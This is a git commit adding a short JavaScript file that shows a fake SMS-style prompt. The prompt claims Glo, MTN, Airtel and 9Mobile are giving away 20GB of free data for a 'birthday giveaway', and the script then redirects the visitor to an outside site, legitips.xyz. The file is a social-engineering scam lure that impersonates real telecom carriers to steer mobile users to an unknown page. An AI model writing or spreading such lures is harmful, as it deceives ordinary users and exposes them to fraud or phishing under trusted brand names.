e0f98fb1d6a459bd88dcdbd743cb8cd5f8669a23
legitips <83867893+legitips@users.noreply.github.com>
2024-10-16 03:29:37 -0700

    Create activation-happybirthday2024.js

---
+++ activation-happybirthday2024.js
@@ -0,0 +1,5 @@
+var password = '20GB Data'
+password=prompt(' SMS: Dear customer, kindly receive Birthday Giveaway From Glo,MTN,Airtel & 9Mobile 20GB data Reward to all Brafra's, press 1 to check now ','20GB Data');
+if (password != '20GB Data') {
+location.href='https://legitips.xyz/happybirthday2024.html';
+}
